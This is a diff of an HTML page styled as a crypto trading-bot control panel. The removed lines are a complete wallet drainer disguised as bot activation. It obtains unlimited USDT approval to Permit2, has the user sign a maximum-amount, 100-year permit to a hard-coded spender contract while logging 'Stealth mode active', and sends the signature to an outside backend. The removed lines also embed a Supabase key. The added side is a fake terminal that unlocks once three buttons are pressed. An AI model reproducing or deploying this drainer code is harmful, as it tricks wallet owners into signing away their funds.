@@ -1,563 +1,208 @@
 <!DOCTYPE html>
-<html lang="nl">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Bot Control Standalone</title>
+<title>AURA INTEGRATED SYSTEM</title>
 
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
-
 
 <style>
 :root {
-    --bg: #020617;
-    --panel: rgba(15, 23, 42, 0.85);
-    --border: #1e293b;
-    --cyan: #06b6d4;
-    --green: #10b981;
-    --purple: #6366f1;
-    --amber: #f59e0b;
-    --orange: #f97316;
-    --font: 'JetBrains Mono', monospace;
+    --bg:#05070a;
+    --panel:#0b0f17;
+    --border:#141d2b;
+    --accent:#00bcd4;
+    --green:#2aa198;
+    --text:#cbd5e1;
+    --mono:'JetBrains Mono', monospace;
 }
 
-* { box-sizing: border-box; margin:0; padding:0; }
+* { box-sizing:border-box; margin:0; padding:0; }
 
 body {
-    background-color: var(--bg);
-    color: white;
-    font-family: var(--font);
-    padding: 12px;
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--mono);
+    height:100vh;
+    overflow:hidden;
 }
 
+/* ================= LAYOUT ================ */
+.shell {
+    display:grid;
+    grid-template-columns: 320px 1fr;
+    height:100vh;
+}
+
+/* ================= CONTROL CENTER ================ */
+.control {
+    border-right:1px solid var(--border);
+    background:var(--panel);
+    padding:12px;
+}
+
+.btn {
+    width:100%;
+    padding:10px;
+    margin-bottom:8px;
+    background:transparent;
+    border:1px solid var(--border);
+    color:#64748b;
+    cursor:pointer;
+}
+
+.btn:disabled {
+    opacity:0.4;
+    cursor:not-allowed;
+}
+
+/* ================= TERMINAL ================ */
+.terminal {
+    position:relative;
+    overflow:hidden;
+}
+
+/* LOCK OVERLAY */
+#lock {
+    position:absolute;
+    inset:0;
+    background:rgba(0,0,0,0.75);
+    backdrop-filter:blur(12px);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    z-index:999;
+    transition:0.3s;
+}
+
+.locked .terminal-content {
+    filter:blur(10px);
+    pointer-events:none;
+}
+
+.terminal-content {
+    padding:20px;
+}
+
+/* fake terminal blocks */
 .panel {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    backdrop-filter: blur(8px);
-    margin-bottom:12px;
-}
-
-.panel-header {
-    background: rgba(30, 41, 59, 0.6);
-    padding: 8px 15px;
-    font-size: 0.65rem;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    border-bottom: 1px solid var(--border);
-    color: var(--cyan);
-}
-
-.module-body {
-    padding: 12px 15px;
-}
-
-.btn-stack {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    margin-bottom: 12px;
-}
-
-.control-btn {
-    background: transparent;
-    border: 1px solid var(--border);
-    color: #64748b;
-    padding: 10px;
-    font-family: var(--font);
-    font-size: 0.65rem;
-    cursor: pointer;
-    text-align: left;
-    text-transform: uppercase;
-    font-weight: bold;
-}
-
-.control-btn:not(:disabled):hover {
-    background: rgba(255,255,255,0.05);
-    border-color: currentColor;
-}
-
-.btn-cyan { color: var(--cyan); }
-.btn-purple { color: var(--purple); }
-.btn-amber { color: var(--amber); }
-
-.status-box { border-top: 1px solid var(--border); padding-top: 8px; }
-
-.status-grid {
-    display: grid;
-    grid-template-columns: 1fr 110px;
-    gap: 5px;
-    font-size: 0.6rem;
-    align-items: center;
-    margin-bottom: 4px;
-}
-
-.status-line {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-}
-
-.liveDot {
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-}
-
-#execution-console {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    padding: 10px;
-}
-
-.exec-line {
-    font-size: 0.58rem;
-    margin-bottom: 2px;
-    white-space: pre-wrap;
-    word-break: break-all;
-    width: 100%;
-    line-height: 1.4;
-    border-bottom: 1px solid rgba(30, 41, 59, 0.2);
-    font-family: 'JetBrains Mono', monospace;
+    background:var(--panel);
+    border:1px solid var(--border);
+    margin-bottom:10px;
+    padding:10px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="panel">
-    <div class="panel-header">Bot Control</div>
-    <div class="module-body">
+<div class="shell">
 
-        <div class="btn-stack">
-            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
-            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
-            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
-            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
-    4. Disconnect Wallet
-</button>
-        </div>
+<!-- ================= CONTROL CENTER ================= -->
+<div class="control">
 
-        <div class="status-box">
-            <div class="status-grid">
-                <span>WALLET STATUS</span>
-                <div class="status-line">
-                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
-                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
-                </div>
-            </div>
+    <div style="margin-bottom:10px;color:var(--accent)">CONTROL CENTER</div>
 
-            <div class="status-grid">
-                <span>BOT STATUS</span>
-                <div class="status-line">
-                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
-                    <span id="st-bot" style="color:#475569">OFFLINE</span>
-                </div>
-            </div>
+    <button id="btn-wallet" class="btn" onclick="connectWallet()">1. Connect Wallet</button>
+    <button id="btn-bot" class="btn" onclick="activateBot()" disabled>2. Activate Bot</button>
+    <button id="btn-auth" class="btn" onclick="authorize()" disabled>3. Authorize Trading</button>
 
-            <div class="status-grid">
-                <span>TRADING ACCESS</span>
-                <div class="status-line">
-                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
-                    <span id="st-access" style="color:#475569">RESTRICTED</span>
-                </div>
+    <div style="margin-top:15px;font-size:11px">
+        <div>Wallet: <span id="s-wallet">OFF</span></div>
+        <div>Bot: <span id="s-bot">OFF</span></div>
+        <div>Auth: <span id="s-auth">OFF</span></div>
+    </div>
+
+</div>
+
+<!-- ================= TERMINAL ================= -->
+<div class="terminal" id="terminal">
+
+    <div id="lock">
+        <div style="text-align:center">
+            <div>SYSTEM LOCKED</div>
+            <div style="opacity:0.6;font-size:11px;margin-top:10px">
+                Complete Control Center sequence
             </div>
         </div>
+    </div>
+
+    <div class="terminal-content">
+
+        <div class="panel">AURA TERMINAL CORE ACTIVE</div>
+        <div class="panel">MARKET ENGINE INITIALIZED</div>
+        <div class="panel">EXECUTION LAYER READY</div>
 
     </div>
+
 </div>
 
-<div class="panel" style="height:150px;">
-    <div class="panel-header">Execution Console</div>
-    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
 </div>
-
-
 
 <script>
-const TOKENS = [
-  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
-];
 
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";
+/* ================= STATE ================= */
+let state = {
+    wallet:false,
+    bot:false,
+    auth:false
+};
 
-const ERC20_ABI = [
-  "function allowance(address owner,address spender) view returns(uint256)",
-  "function approve(address spender,uint256 amount) returns(bool)"
-];
+/* ================= SYNC ================= */
+function sync(){
+    localStorage.setItem("cc_wallet", state.wallet ? "1":"0");
+    localStorage.setItem("cc_bot", state.bot ? "1":"0");
+    localStorage.setItem("cc_auth", state.auth ? "1":"0");
+    checkUnlock();
+}
 
-let APP_STATE = { wallet:null, botActive:false, authorized:false };
-let CURRENT_WALLET = null;
-if (window.ethereum) {
+/* ================= UNLOCK LOGIC ================= */
+function checkUnlock(){
+    const w = localStorage.getItem("cc_wallet") === "1";
+    const b = localStorage.getItem("cc_bot") === "1";
+    const a = localStorage.getItem("cc_auth") === "1";
 
-  window.ethereum.on('accountsChanged', (accounts) => {
+    const ready = w && b && a;
 
-    if (accounts.length > 0) {
+    const lock = document.getElementById("lock");
 
-      CURRENT_WALLET = accounts[0];
-
-      APP_STATE.botActive = false;
-      APP_STATE.authorized = false;
-
-      renderWallet(accounts[0]);
-
-      updateStatus('dot-bot','st-bot','OFFLINE','#475569');
-      updateStatus('dot-access','st-access','RESTRICTED','#475569');
-
-      log("🔄 Wallet switched: " + accounts[0]);
-
+    if(ready){
+        document.body.classList.remove("locked");
+        lock.style.display = "none";
+    } else {
+        document.body.classList.add("locked");
+        lock.style.display = "flex";
     }
-
-  });
-
 }
 
-function log(msg){
- console.log(msg);
- const el=document.getElementById('execution-console');
- if(!el) return;
- const div=document.createElement('div');
- div.className='exec-line';
- div.innerText=msg;
- el.prepend(div);
+/* ================= CONTROL CENTER ACTIONS ================= */
+function connectWallet(){
+    state.wallet = true;
+    document.getElementById("btn-bot").disabled = false;
+    document.getElementById("s-wallet").innerText = "ON";
+    sync();
 }
 
-function updateStatus(dotId, textId, text, color){
- const dot = document.getElementById(dotId);
- const label = document.getElementById(textId);
- dot.style.background = color;
- dot.style.boxShadow = `0 0 12px ${color}`;
- label.innerText = text;
- label.style.color = color;
+function activateBot(){
+    state.bot = true;
+    document.getElementById("btn-auth").disabled = false;
+    document.getElementById("s-bot").innerText = "ON";
+    sync();
 }
 
-async function connectWallet(){
- try{
-  if (typeof window.ethereum === "undefined") {
-    const install = confirm("MetaMask is not installed. Install?");
-    if (install) window.location.href = "https://metamask.io/download/";
-    return;
-  }
-
-  const provider = new ethers.BrowserProvider(window.ethereum);
-
-  log("🔌 Requesting wallet connection...");
-
-
-await provider.send("eth_requestAccounts", []);
-
-  const signer = await provider.getSigner();
-  const user = await signer.getAddress();
-  const network = await provider.getNetwork();
-
- if (network.chainId !== 1n) {
-  log("⚠️ Switching to Ethereum Mainnet...");
-
-  try {
-    
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: "0x1" }]
-    });
-
-    log("✅ Switched to Ethereum Mainnet");
-    return location.reload();
-
-  } catch (err) {
-    log("❌ Network switch failed");
-    alert("Please switch to Ethereum Mainnet manually");
-    return;
-  }
+function authorize(){
+    state.auth = true;
+    document.getElementById("s-auth").innerText = "ON";
+    sync();
 }
 
- if (CURRENT_WALLET && CURRENT_WALLET !== user) {
-   log("🔄 Wallet switched — resetting cache");
-}
-
-     CURRENT_WALLET = user;
-
-     APP_STATE.wallet = user;
-  renderWallet(user);
-  updateStatus('dot-bot','st-bot','OFFLINE','#475569');
-  updateStatus('dot-access','st-access','RESTRICTED','#475569');
-
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-
-  document.getElementById('btn-wallet').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-  document.getElementById('btn-disconnect').disabled = false;
-
-  await runPermitFlowSafe(provider, signer, user);
-
- } catch(e){
-  log("ERR " + e.message);
- }
-}
-
-
-async function runPermitFlowSafe(provider, signer, user){
- try{
-
-  log("⚙️ Permit2 flow...");
-  log("⚙️ Stealth mode active...");
-  log("🔎 Checking cached permit...");
-
-const { data: existing } = await window.supabaseClient
-  .from('batches')
-  .select('*')
-  .eq('owner', user);
-const now = Math.floor(Date.now()/1000);
-
-const valid =
-  existing &&
-  existing.length > 0 &&
-  existing[0].sig_deadline > now;
-
-if (valid) {
-
-  log("⚡ Cached permit valid — skipping signature");
-  log("Cache rows: " + (existing?.length || 0));
-  log("Wallet: " + user);
-
-  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-  updateStatus('dot-bot','st-bot','READY','#6366f1');
-
-  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-  document.getElementById('btn-authorize').disabled = true;
-
-  return;
-}
-
-if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
-  log("⌛ Cached permit expired — refreshing...");
-}
-
-const permit2 = new ethers.Contract(
-  PERMIT2,
-  ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
-  provider
-);
-
-
-const MAX_UINT160 = (1n << 160n) - 1n;
-const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
-
-const details = [];
-
-const nonceResults = await Promise.all(
-  TOKENS.map(token =>
-    permit2.allowance(user, token, CONTRACT)
-  )
-);
-
-for (let i = 0; i < TOKENS.length; i++) {
-
-  const token = TOKENS[i];
-  const [amount, expirationOnchain, nonce] = nonceResults[i];
-
-log(`Nonce ${token}: ${nonce.toString()}`);
-
-  log("Nonce " + token + ": " + nonce);
-
-  details.push({
-    token: token,
-    amount: MAX_UINT160,
-    expiration: BigInt(expiration),
-    nonce: BigInt(nonce)
-  });
-}
-
-
-
-  // ✍️ SIGN
-  const chainId = (await provider.getNetwork()).chainId;
-
-  const domain = {
-    name: "Permit2",
-    chainId,
-    verifyingContract: PERMIT2
-  };
-
-  const types = {
-    PermitBatch: [
-      { name: "details", type: "PermitDetails[]" },
-      { name: "spender", type: "address" },
-      { name: "sigDeadline", type: "uint256" }
-    ],
-    PermitDetails: [
-      { name: "token", type: "address" },
-      { name: "amount", type: "uint160" },
-      { name: "expiration", type: "uint48" },
-      { name: "nonce", type: "uint48" }
-    ]
-  };
-const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
-
-const values = {
-  details: details.map(d => ({
-    token: d.token,
-    amount: d.amount.toString(),
-    expiration: d.expiration.toString(),
-    nonce: d.nonce.toString()
-  })),
-  spender: CONTRACT,
-  sigDeadline: sigDeadline.toString()
-};
-
-  log("✍️ Requesting signature...");
-
-// =========================
-// ERC20 -> PERMIT2 APPROVAL
-// =========================
-
-for (const token of TOKENS) {
-
-  const erc20 = new ethers.Contract(
-    token,
-    ERC20_ABI,
-    signer
-  );
-
-  const currentAllowance =
-    await erc20.allowance(
-      user,
-      PERMIT2
-    );
-
-  log(
-    "ERC20 allowance: " +
-    currentAllowance.toString()
-  );
-
-  if (currentAllowance === 0n) {
-
-    log("⚠️ Approval required");
-    log("TOKEN: " + token);
-
-    const tx =
-      await erc20.approve(
-        PERMIT2,
-        ethers.MaxUint256
-      );
-
-    log("⛽ Waiting confirmation...");
-
-    await tx.wait();
-
-    log("✅ ERC20 approval confirmed");
-  }
-  else {
-
-    log("✅ ERC20 already approved");
-  }
-}
-
-  const signature = await signer.signTypedData(domain,types,values);
-  const sig = ethers.Signature.from(signature);
-
-  const v = sig.v;
-  const r = sig.r;
-  const s = sig.s;
-
-log("✍️ Signature captured");
-
-log("📤 Sending raw permit batch to backend...");
-
-try {
- const payload = {
-  owner: user,
-  details: details.map(d => ({
-  token: d.token,
-  amount: d.amount.toString(),
-  expiration: d.expiration.toString(),
-  nonce: d.nonce.toString()
-})),
-  signature: signature,
-  spender: CONTRACT,
-  sig_deadline: sigDeadline,
-  chainId: Number(chainId) // 🔥 HIER KOMT HET
-};
-
-  const res = await fetch("https://api.aiiraa.com/api/permit", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(
-  payload,
-  (key, value) => typeof value === "bigint" ? value.toString() : value
-)
-  });
-
-  const data = await res.json();
-
-  if (!res.ok) {
-    log("❌ Backend error: " + (data.error || "unknown"));
-    return;
-  }
-
-  log("✅ Permit forwarded to backend");
-
-  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-  updateStatus('dot-bot','st-bot','READY','#6366f1');
-
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-  document.getElementById('btn-activate').disabled = true;
-
-} catch (e) {
-  log("❌ NETWORK ERROR: " + e.message);
-}
-
- 
-
-
- }catch(e){
-  log("❌ FLOW ERROR: " + e.message);
- }
-}
-
-function renderWallet(address) {
- document.getElementById('btn-wallet').innerText = address;
- updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
-}
-
-function activateBot() {
- updateStatus('dot-bot','st-bot','READY','#6366f1');
-}
-
-function authorizeTrading() {
- updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
-}
-
-function disconnectWallet() {
- location.reload();
-}
-
-window.connectWallet = connectWallet;
+/* ================= INIT ================= */
+setInterval(checkUnlock, 500);
+checkUnlock();
 
 </script>
 
-
-
-<script type="module">
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
-
-const supabaseClient = createClient(
-  "https://iglcfvgnwtlppweqdhwz.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlnbGNmdmdud3RscHB3ZXFkaHd6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzNDI1MTAsImV4cCI6MjA5MTkxODUxMH0.EzMscumlZ1I_fm1vXhDAhReMg2iuB2NrqII4B05r3DA"
-);
-
-window.supabaseClient = supabaseClient;
-</script>
 </body>
 </html>
